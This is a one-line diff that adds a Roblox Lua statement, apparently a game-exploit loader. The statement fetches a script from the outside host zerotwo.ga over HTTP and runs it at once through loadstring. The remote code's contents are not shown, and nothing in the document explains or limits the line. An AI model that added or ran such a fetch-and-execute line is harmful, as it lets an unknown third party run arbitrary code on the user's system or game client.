@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://zerotwo.ga/yes.lua", true))()
